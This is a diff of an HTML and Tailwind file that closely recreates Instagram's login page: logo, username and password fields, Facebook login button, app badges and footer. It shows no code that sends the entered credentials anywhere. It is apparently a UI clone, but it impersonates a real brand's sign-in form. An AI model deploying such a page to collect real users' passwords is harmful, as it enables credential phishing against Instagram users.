@@ -4,55 +4,61 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login • Instagram</title>
-    <link rel="icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/x-icon">
     <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 24 24%22 fill=%22%23E1306C%22><path d=%22M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/></svg>
 </head>
-<body class="bg-[#fafafa] text-[#262626] font-sans antialiased flex flex-col min-h-screen justify-between">
+<body class="bg-[#fafafa] text-[#262626] min-h-screen flex flex-col justify-between font-sans">
 
     <!-- Main Container -->
-    <div class="flex flex-col items-center justify-center flex-grow py-8 px-4 sm:px-0">
-        <div class="flex items-center justify-center max-w-[935px] w-full gap-8">
+    <main class="flex-grow flex items-center justify-center px-4 py-8">
+        <div class="flex max-w-[935px] w-full justify-center items-center">
             
-            <!-- Left: Phone Mockup with Rotating Screenshots (Hidden on mobile) -->
-            <div class="hidden lg:flex relative bg-[url('https://static.cdninstagram.com/rsrc.io/v3/y4/r/ItTndlZMxy-.png')] bg-no-repeat h-[581px] w-[454px] bg-[length:454px_618px] bg-[top_left_-46px]">
-                <div class="absolute top-[27px] right-[62px] w-[250px] h-[538px] overflow-hidden">
-                    <img src="https://static.cdninstagram.com/rsrc.io/v3/yx/r/pyD_TgngbzI.png" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 ease-in-out phone-slide active">
-                    <img src="https://static.cdninstagram.com/rsrc.io/v3/yS/r/jpZfnvqeYf5.png" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 ease-in-out phone-slide opacity-0">
-                    <img src="https://static.cdninstagram.com/rsrc.io/v3/yt/r/dhJYhTdfrsd.png" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 ease-in-out phone-slide opacity-0">
-                    <img src="https://static.cdninstagram.com/rsrc.io/v3/y2/r/lrmDubvVvqa.png" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 ease-in-out phone-slide opacity-0">
+            <!-- Phone Mockup Container (Desktop Only) -->
+            <div class="hidden lg:flex relative w-[380px] h-[581px] bg-no-repeat bg-[url('https://static.cdninstagram.com/images/instagram/xig/homepage/phones/home-phones.png?__placeholder=a892b')] bg-[length:468px_634px] bg-[-46px_-15px] items-center justify-center mr-8">
+                <div class="absolute w-[250px] h-[538px] top-[27px] left-[113px] overflow-hidden rounded-[32px] bg-black shadow-inner">
+                    <div id="phone-slideshow" class="relative w-full h-full">
+                        <img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?auto=format&fit=crop&w=600&q=80" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 opacity-100 slide-img" alt="Instagram Feed 1">
+                        <img src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?auto=format&fit=crop&w=600&q=80" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 opacity-0 slide-img" alt="Instagram Feed 2">
+                        <img src="https://images.unsplash.com/photo-1488161628813-04466f872be2?auto=format&fit=crop&w=600&q=80" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 opacity-0 slide-img" alt="Instagram Feed 3">
+                        <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=600&q=80" class="absolute inset-0 w-full h-full object-cover transition-opacity duration-1000 opacity-0 slide-img" alt="Instagram Feed 4">
+                    </div>
                 </div>
             </div>
 
-            <!-- Right: Forms Box -->
-            <div class="flex flex-col w-full max-w-[350px]">
+            <!-- Right Form Section -->
+            <div class="w-full max-w-[350px] flex flex-col">
                 
                 <!-- Login Card -->
-                <div class="bg-white border border-[#dbdbdb] flex flex-col items-center pt-8 pb-4 px-10 mb-2 rounded-[1px]">
-                    <!-- Instagram Logo -->
-                    <h1 class="sr-only">Instagram</h1>
+                <div class="bg-white border border-[#dbdbdb] rounded-sm px-10 pt-8 pb-6 mb-3 flex flex-col items-center">
+                    <!-- Instagram Logo SVG -->
                     <div class="mb-8 mt-2">
-                        <img src="https://static.cdninstagram.com/rsrc.io/v3/yv/r/BQ9GNBCuFGc.png" alt="Instagram" class="w-[175px] h-[51px] object-contain">
+                        <svg aria-label="Instagram" class="_ab6-" role="img" viewBox="0 0 175 51" width="175" height="51">
+                            <path fill="currentColor" d="M15.42 1.34A18.8 18.8 0 0 1 21.6 3.2a13.3 13.3 0 0 1 4.7 3.14 13.3 13.3 0 0 1 3.14 4.7 18.8 18.8 0 0 1 1.86 6.18c.16 1.48.2 1.94.2 5.78s-.04 4.3-.2 5.78a18.8 18.8 0 0 1-1.86 6.18 13.3 13.3 0 0 1-3.14 4.7 13.3 13.3 0 0 1-4.7 3.14 18.8 18.8 0 0 1-6.18 1.86c-1.48.16-1.94.2-5.78.2s-4.3-.04-5.78-.2a18.8 18.8 0 0 1-6.18-1.86 13.3 13.3 0 0 1-4.7-3.14 13.3 13.3 0 0 1-3.14-4.7A18.8 18.8 0 0 1 1.34 22c-.16-1.48-.2-1.94-.2-5.78s.04-4.3.2-5.78a18.8 18.8 0 0 1 1.86-6.18 13.3 13.3 0 0 1 3.14-4.7 13.3 13.3 0 0 1 4.7-3.14A18.8 18.8 0 0 1 17.2 1.34c1.48-.16 1.94-.2 5.78-.2s4.3.04 5.78.2m0-1.34C11.42 0 10.92.02 9.37.08 7.82.15 6.77.38 5.85.74a14.6 14.6 0 0 0-5.3 3.46A14.6 14.6 0 0 0 .74 9.5c-.36.92-.6 1.97-.66 3.52C.02 14.58 0 15.08 0 19.08s.02 4.5.08 6.05c.07 1.55.3 2.6.66 3.52a14.6 14.6 0 0 0 3.46 5.3 14.6 14.6 0 0 0 5.3 3.46c.92.36 1.97.6 3.52.66 1.55.06 2.05.08 6.05.08s4.5-.02 6.05-.08c1.55-.07 2.6-.3 3.52-.66a14.6 14.6 0 0 0 5.3-3.46 14.6 14.6 0 0 0 3.46-5.3c.36-.92.6-1.97.66-3.52.06-1.55.08-2.05.08-6.05s-.02-4.5-.08-6.05c-.07-1.55-.3-2.6-.66-3.52a14.6 14.6 0 0 0-3.46-5.3 14.6 14.6 0 0 0-5.3-3.46c-.92-.36-1.97-.6-3.52-.66C23.58.02 23.08 0 19.08 0h-3.66zM19.08 9.3c-5.4 0-9.78 4.38-9.78 9.78s4.38 9.78 9.78 9.78 9.78-4.38 9.78-9.78-4.38-9.78-9.78-9.78zm0 18.22c-4.66 0-8.44-3.78-8.44-8.44s3.78-8.44 8.44-8.44 8.44 3.78 8.44 8.44-3.78 8.44-8.44 8.44zm11.23-18.74a2.28 2.28 0 1 1-4.56 0 2.28 2.28 0 0 1 4.56 0z"></path>
+                            <path fill="currentColor" d="M51.84 37.16h-4.08V14.16h4.08zM49.8 11.8a2.6 2.6 0 1 1 2.6-2.6 2.6 2.6 0 0 1-2.6 2.6M60.12 37.16h-4.08V23.44c0-3.48 1.92-5.4 5.04-5.4 1.8 0 3.12.36 3.72.72l-.48 3.84c-.6-.24-1.56-.48-2.64-.48-1.56 0-2.56.84-2.56 2.64zM69.84 37.16h-4.08V14.16h4.08zM89.76 21.28l3.48-7.12h4.56l-5.64 10.68 5.88 12.32h-4.56l-3.72-7.8-3.72 7.8h-4.56l5.88-12.32-5.64-10.68h4.56zM108.6 37.16h-4.08V23.44c0-3.48 1.92-5.4 5.04-5.4 1.8 0 3.12.36 3.72.72l-.48 3.84c-.6-.24-1.56-.48-2.64-.48-1.56 0-2.56.84-2.56 2.64zM120.24 37.16h-4.08V14.16h4.08zM129.36 17.08c1.32 0 2.4-.48 3.12-1.32l2.64 2.28c-1.44 1.68-3.6 2.76-5.76 2.76-4.92 0-8.52-3.72-8.52-8.52 0-4.8 3.6-8.52 8.52-8.52 2.16 0 4.32 1.08 5.76 2.76l-2.64 2.28c-.72-.84-1.8-1.32-3.12-1.32-2.76 0-4.44 1.92-4.44 4.8 0 2.88 1.68 4.8 4.44 4.8zM153.24 37.16h-4.08v-2.04c-1.32 1.56-3.36 2.4-5.4 2.4-3.72 0-6.72-3-6.72-6.72 0-3.72 3-6.72 6.72-6.72 2.04 0 4.08.84 5.4 2.4V14.16h4.08zM149.16 29.32c0-1.8-1.44-3.24-3.24-3.24s-3.24 1.44-3.24 3.24 1.44 3.24 3.24 3.24 3.24-1.44 3.24-3.24zM169.32 23.08c-.72-.36-1.56-.6-2.52-.6-2.04 0-3.12 1.08-3.12 3.12v11.56h-4.08V14.16h4.08v2.4c1.2-1.8 2.88-2.64 4.8-2.64.6 0 1.08.08 1.56.24z"></path>
+                        </svg>
                     </div>
 
                     <!-- Login Form -->
-                    <form id="loginForm" class="w-full flex flex-col gap-2">
-                        <div class="relative flex items-center w-full">
-                            <input type="text" id="username" name="username" required
-                                class="w-full bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] text-xs px-2 pt-3 pb-1 focus:outline-none focus:border-[#a8a8a8] text-[#262626] peer">
-                            <label for="username" class="absolute text-[11px] text-[#8e8e8e] left-2 transition-all duration-150 ease-in-out pointer-events-none peer-valid:text-[10px] peer-valid:top-1 peer-focus:text-[10px] peer-focus:top-1">Phone number, username, or email</label>
+                    <form id="login-form" class="w-full flex flex-col gap-2">
+                        <!-- Username / Email / Phone Input -->
+                        <div class="relative flex items-center bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] focus-within:border-[#8e8e8e] transition-colors">
+                            <input type="text" id="username" name="username" aria-label="Phone number, username, or email" required 
+                                class="w-full px-2 pt-3 pb-1 text-xs bg-transparent outline-none text-[#262626] peer placeholder-transparent">
+                            <label for="username" class="absolute left-2 text-xs text-[#8e8e8e] transition-all duration-150 pointer-events-none peer-valid:text-[10px] peer-valid:top-1 peer-focus:text-[10px] peer-focus:top-1 peer-focus:translate-y-0 peer-not-placeholder-shown:text-[10px] peer-not-placeholder-shown:top-1">Phone number, username, or email</label>
                         </div>
 
-                        <div class="relative flex items-center w-full">
-                            <input type="password" id="password" name="password" required
-                                class="w-full bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] text-xs px-2 pt-3 pb-1 pr-10 focus:outline-none focus:border-[#a8a8a8] text-[#262626] peer">
-                            <label for="password" class="absolute text-[11px] text-[#8e8e8e] left-2 transition-all duration-150 ease-in-out pointer-events-none peer-valid:text-[10px] peer-valid:top-1 peer-focus:text-[10px] peer-focus:top-1">Password</label>
-                            <button type="button" id="togglePassword" class="hidden absolute right-2 text-xs font-semibold text-[#262626] focus:outline-none">Show</button>
+                        <!-- Password Input with Toggle -->
+                        <div class="relative flex items-center bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] focus-within:border-[#8e8e8e] transition-colors">
+                            <input type="password" id="password" name="password" aria-label="Password" required 
+                                class="w-full px-2 pt-3 pb-1 text-xs bg-transparent outline-none text-[#262626] peer placeholder-transparent pr-12">
+                            <label for="password" class="absolute left-2 text-xs text-[#8e8e8e] transition-all duration-150 pointer-events-none peer-valid:text-[10px] peer-valid:top-1 peer-focus:text-[10px] peer-focus:top-1 peer-focus:translate-y-0 peer-not-placeholder-shown:text-[10px] peer-not-placeholder-shown:top-1">Password</label>
+                            <button type="button" id="toggle-password" class="absolute right-2 text-xs font-semibold text-[#262626] hidden focus:outline-none">Show</button>
                         </div>
 
-                        <button type="submit" id="submitBtn" disabled
-                            class="mt-2 bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold text-sm py-1.5 rounded-[8px] transition-all duration-150 opacity-30 cursor-pointer">
+                        <!-- Submit Button -->
+                        <button type="submit" id="submit-btn" disabled 
+                            class="mt-2 w-full bg-[#0095f6] hover:bg-[#1877f2] active:opacity-75 text-white font-semibold text-sm py-1.5 rounded-[8px] transition-all cursor-pointer disabled:opacity-70 disabled:cursor-default">
                             Log in
                         </button>
                     </form>
@@ -60,41 +66,89 @@
                     <!-- Divider -->
                     <div class="flex items-center w-full my-4">
                         <div class="flex-grow border-t border-[#dbdbdb]"></div>
-                        <span class="mx-4 text-[#8e8e8e] font-semibold text-[13px] uppercase tracking-wider">or</span>
+                        <span class="mx-4 text-xs font-semibold text-[#8e8e8e] uppercase">OR</span>
                         <div class="flex-grow border-t border-[#dbdbdb]"></div>
                     </div>
 
                     <!-- Facebook Login -->
-                    <button type="button" class="flex items-center justify-center gap-2 mb-4 text-[#385185] font-semibold text-sm hover:opacity-80 transition">
-                        <i class="fa-brands fa-square-facebook text-xl"></i>
-                        <span>Log in with Facebook</span>
+                    <button type="button" class="flex items-center justify-center text-[#385185] font-semibold text-sm mb-4 hover:opacity-80 transition-opacity">
+                        <!-- Facebook Logo SVG -->
+                        <svg class="mr-2" width="16" height="16" viewBox="0 0 24 24" fill="#385185">
+                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                        </svg>
+                        Log in with Facebook
                     </button>
 
                     <!-- Forgot Password -->
-                    <a href="#" class="text-xs text-[#00376b] hover:underline mb-2">Forgot password?</a>
+                    <a href="#" class="text-xs text-[#00376b] hover:underline">Forgot password?</a>
                 </div>
 
-                <!-- Sign Up Card -->
-                <div class="bg-white border border-[#dbdbdb] py-4 text-center text-sm rounded-[1px] mb-4">
-                    <p class="text-[#262626]">Don't have an account? <a href="#" class="text-[#0095f6] font-semibold hover:underline">Sign up</a></p>
+                <!-- Sign up Box -->
+                <div class="bg-white border border-[#dbdbdb] rounded-sm py-5 text-center text-sm mb-4">
+                    <p class="text-sm">Don't have an account? <a href="#" class="text-[#0095f6] font-semibold">Sign up</a></p>
                 </div>
 
-                <!-- Get App Section -->
-                <div class="flex flex-col items-center gap-3">
-                    <p class="text-sm text-[#262626]">Get the app.</p>
-                    <div class="flex gap-2 justify-center">
-                        <a href="#" class="inline-block"><img src="https://static.cdninstagram.com/rsrc.io/v3/yT/r/OUMeyfQvg3d.png" alt="Get it on Google Play" class="h-10 object-contain"></a>
-                        <a href="#" class="inline-block"><img src="https://static.cdninstagram.com/rsrc.io/v3/y5/r/TJztvEsftfr.png" alt="Get it from Microsoft" class="h-10 object-contain"></a>
+                <!-- Get the App Section -->
+                <div class="text-center">
+                    <p class="text-sm mb-4">Get the app.</p>
+                    <div class="flex justify-center gap-2">
+                        <!-- App Store Badge SVG -->
+                        <a href="#" aria-label="Get it on App Store" class="inline-block">
+                            <svg width="136" height="40" viewBox="0 0 136 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <rect width="136" height="40" rx="4" fill="black"/>
+                                <path d="M33.4 20.2c0-3.1 2.5-4.6 2.6-4.7-1.4-2-3.6-2.3-4.4-2.4-1.9-.2-3.7 1.1-4.7 1.1-1 0-2.5-1.1-4.1-1.1-2.1 0-4.1 1.2-5.2 3.1-2.2 3.8-.6 9.4 1.5 12.5 1 1.5 2.2 3.1 3.8 3 1.5-.1 2.1-1 4-1 1.9 0 2.5 1 4 1 1.6 0 2.7-1.5 3.7-3 1.2-1.7 1.7-3.4 1.7-3.5-.1 0-3.2-1.2-3.2-5.1zm-3-8.8c.8-.9 1.4-2.2 1.2-3.5-1.2.1-2.6.8-3.4 1.7-.8.9-1.5 2.2-1.3 3.5 1.3.1 2.7-.7 3.5-1.7z" fill="white"/>
+                                <path d="M51.9 28.5h-5.2l-1.1 3.1h-2.3l4.9-12.8h2.3l4.9 12.8h-2.4l-1.1-3.1zm-4.6-1.7h4l-2-5.5-2 5.5zm19.8 4.5c-2.3 0-3.9-1.6-3.9-4v-8.8h2.2v8.5c0 1.4.8 2.2 2.2 2.2 1.4 0 2.2-.8 2.2-2.2v-8.5h2.2v8.8c0 2.4-1.6 4-3.9 4zm11.9.2c-3.1 0-5.3-2.3-5.3-5.7s2.2-5.7 5.3-5.7c3.1 0 5.3 2.3 5.3 5.7s-2.2 5.7-5.3 5.7zm0-1.8c1.8 0 3-1.2 3-3.9s-1.2-3.9-3-3.9c-1.8 0-3 1.2-3 3.9s1.2 3.9 3 3.9zm13.1 1.8c-2.2 0-3.7-1.1-4.3-2.8h-.1v2.5h-2.2v-12.8h2.2v4.5h.1c.6-1.7 2.1-2.8 4.3-2.8 2.8 0 4.9 2.2 4.9 5.7 0 3.5-2.1 5.7-4.9 5.7zm-.5-1.8c1.8 0 3-1.2 3-3.9s-1.2-3.9-3-3.9c-1.8 0-3 1.2-3 3.9s1.2 3.9 3 3.9zm12.3 1.8c-2.3 0-3.9-1.6-3.9-4v-8.8h2.2v8.5c0 1.4.8 2.2 2.2 2.2 1.4 0 2.2-.8 2.2-2.2v-8.5h2.2v8.8c0 2.4-1.6 4-3.9 4zm12.6.2c-1.5 0-2.8-.6-3.4-1.7h-.1v1.5h-2.2v-16.5h2.2v5.6h.1c.6-1.1 1.9-1.7 3.4-1.7 2.8 0 4.8 2.2 4.8 5.7s-2 5.7-4.8 5.7zm-.3-1.8c1.8 0 2.9-1.2 2.9-3.9s-1.1-3.9-2.9-3.9c-1.8 0-2.9 1.2-2.9 3.9s1.1 3.9 2.9 3.9z" fill="white"/>
+                            </svg>
+                        </a>
+                        <!-- Google Play Badge SVG -->
+                        <a href="#" aria-label="Get it on Google Play" class="inline-block">
+                            <svg width="136" height="40" viewBox="0 0 136 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <rect width="136" height="40" rx="4" fill="black"/>
+                                <path d="M28.3 20.3L16 11.2c-.4-.3-.9-.3-1.4 0-.5.3-.8.8-.8 1.4v18.7c0 .6.3 1.1.8 1.4.3.2.6.2.9.2.2 0 .5-.1.7-.2l12.3-9.1c.4-.3.6-.8.6-1.3 0-.6-.2-1.1-.6-1.4z" fill="url(#paint0_linear)"/>
+                                <path d="M31.2 22.4l-2.9-2.1L15.4 30.6c.4.3.9.4 1.5.4 1 0 2-.4 2.7-.9l11.6-7.7z" fill="url(#paint1_linear)"/>
+                                <path d="M31.2 17.6L19.6 9.9c-.7-.5-1.7-.9-2.7-.9-.6 0-1.1.1-1.5.4l12.9 10.3 2.9-2.1z" fill="url(#paint2_linear)"/>
+                                <path d="M15.4 10.3v19.4L28.3 20 15.4 10.3z" fill="url(#paint3_linear)"/>
+                                <path d="M48.8 24.3h-7.6v2.9h8.3v1.8h-10.5v-12h10.3v1.8h-8.1v2.7h7.6v2.8zm7.3 2.8c-1.4 0-2.4-.4-3.1-1.3-.7-.9-1-2.1-1-3.6s.3-2.7 1-3.6c.7-.9 1.7-1.3 3.1-1.3 1.4 0 2.4.4 3.1 1.3.7.9 1 2.1 1 3.6s-.3 2.7-1 3.6c-.7.9-1.7 1.3-3.1 1.3zm0-1.7c.8 0 1.3-.3 1.7-.9.4-.6.6-1.5.6-2.7s-.2-2.1-.6-2.7c-.4-.6-.9-.9-1.7-.9-.8 0-1.3.3-1.7.9-.4.6-.6 1.5-.6 2.7s.2 2.1.6 2.7c.4.6.9.9 1.7.9zm13.1 1.7c-1.4 0-2.4-.4-3.1-1.3-.7-.9-1-2.1-1-3.6s.3-2.7 1-3.6c.7-.9 1.7-1.3 3.1-1.3 1.4 0 2.4.4 3.1 1.3.7.9 1 2.1 1 3.6s-.3 2.7-1 3.6c-.7.9-1.7 1.3-3.1 1.3zm0-1.7c.8 0 1.3-.3 1.7-.9.4-.6.6-1.5.6-2.7s-.2-2.1-.6-2.7c-.4-.6-.9-.9-1.7-.9-.8 0-1.3.3-1.7.9-.4.6-.6 1.5-.6 2.7s.2 2.1.6 2.7c.4.6.9.9 1.7.9zm13.2 1.7c-.8 0-1.5-.2-2-.6-.5-.4-.8-1-1-1.7h-.1c-.2.7-.6 1.3-1.1 1.7-.5.4-1.2.6-2 .6-1.1 0-1.9-.3-2.5-.9-.6-.6-.9-1.5-.9-2.6v-5.6h2.2v5.3c0 .8.2 1.4.6 1.8.4.4 1 .6 1.7.6.7 0 1.3-.2 1.7-.6.4-.4.6-1 .6-1.8v-5.3h2.2v5.3c0 .8.2 1.4.6 1.8.4.4 1 .6 1.7.6.7 0 1.3-.2 1.7-.6.4-.4.6-1 .6-1.8v-5.3h2.2v5.6c0 1.1-.3 2-.9 2.6-.6.6-1.4.9-2.5.9zm14.1 0c-1.1 0-2-.3-2.6-.9-.6-.6-.9-1.4-.9-2.5v-7.6h2.2v7.3c0 .6.2 1.1.6 1.5.4.4.9.6 1.5.6.6 0 1.1-.2 1.5-.6.4-.4.6-.9.6-1.5v-7.3h2.2v7.6c0 1.1-.3 2-.9 2.5-.6.6-1.5.9-2.6.9zm13.8 0c-1.4 0-2.4-.4-3.1-1.3-.7-.9-1-2.1-1-3.6s.3-2.7 1-3.6c.7-.9 1.7-1.3 3.1-1.3 1.4 0 2.4.4 3.1 1.3.7.9 1 2.1 1 3.6s-.3 2.7-1 3.6c-.7.9-1.7 1.3-3.1 1.3zm0-1.7c.8 0 1.3-.3 1.7-.9.4-.6.6-1.5.6-2.7s-.2-2.1-.6-2.7c-.4-.6-.9-.9-1.7-.9-.8 0-1.3.3-1.7.9-.4.6-.6 1.5-.6 2.7s.2 2.1.6 2.7c.4.6.9.9 1.7.9z" fill="white"/>
+                                <defs>
+                                    <linearGradient id="paint0_linear" x1="29.9" y1="20" x2="13.7" y2="20" gradientUnits="userSpaceOnUse">
+                                        <stop stop-color="#00F0FF"/>
+                                        <stop offset="0.24" stop-color="#00BEFF"/>
+                                        <stop offset="0.58" stop-color="#007BFF"/>
+                                        <stop offset="0.85" stop-color="#004BFF"/>
+                                        <stop offset="1" stop-color="#0038FF"/>
+                                    </linearGradient>
+                                    <linearGradient id="paint1_linear" x1="31.2" y1="21.3" x2="15.4" y2="21.3" gradientUnits="userSpaceOnUse">
+                                        <stop stop-color="#FF3A44"/>
+                                        <stop offset="0.37" stop-color="#C31162"/>
+                                        <stop offset="0.79" stop-color="#6800B4"/>
+                                        <stop offset="1" stop-color="#3400DA"/>
+                                    </linearGradient>
+                                    <linearGradient id="paint2_linear" x1="31.2" y1="13.9" x2="14" y2="13.9" gradientUnits="userSpaceOnUse">
+                                        <stop stop-color="#FFCD00"/>
+                                        <stop offset="0.32" stop-color="#FFA800"/>
+                                        <stop offset="0.74" stop-color="#FF6B00"/>
+                                        <stop offset="1" stop-color="#FF4200"/>
+                                    </linearGradient>
+                                    <linearGradient id="paint3_linear" x1="28.3" y1="20" x2="15.4" y2="20" gradientUnits="userSpaceOnUse">
+                                        <stop stop-color="#00E0FF"/>
+                                        <stop offset="0.2" stop-color="#00B6FF"/>
+                                        <stop offset="0.53" stop-color="#0064FF"/>
+                                        <stop offset="0.81" stop-color="#0027FF"/>
+                                        <stop offset="1" stop-color="#0011FF"/>
+                                    </linearGradient>
+                                </defs>
+                            </svg>
+                        </a>
                     </div>
                 </div>
 
             </div>
         </div>
-    </div>
+    </main>
 
     <!-- Footer -->
-    <footer class="w-full max-w-[1050px] mx-auto px-4 py-8 text-xs text-[#8e8e8e]">
-        <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4">
+    <footer class="py-8 px-4 text-center text-xs text-[#8e8e8e]">
+        <div class="flex flex-wrap justify-center gap-x-4 gap-y-2 mb-4 max-w-[1000px] mx-auto">
             <a href="#" class="hover:underline">Meta</a>
             <a href="#" class="hover:underline">About</a>
             <a href="#" class="hover:underline">Blog</a>
@@ -106,17 +160,11 @@
             <a href="#" class="hover:underline">Locations</a>
             <a href="#" class="hover:underline">Instagram Lite</a>
             <a href="#" class="hover:underline">Threads</a>
-            <a href="#" class="hover:underline">Contact Uploading & Non-Users</a>
+            <a href="#" class="hover:underline">Contact Upload & Non-Users</a>
             <a href="#" class="hover:underline">Meta Verified</a>
         </div>
         <div class="flex justify-center gap-4">
-            <select aria-label="Switch Display Language" class="bg-transparent text-xs text-[#8e8e8e] focus:outline-none cursor-pointer">
-                <option value="en">English</option>
-                <option value="es">Español</option>
-                <option value="fr">Français</option>
-                <option value="de">Deutsch</option>
-                <option value="it">Italiano</option>
-            </select>
+            <span>English</span>
             <span>© 2025 Instagram from Meta</span>
         </div>
     </footer>
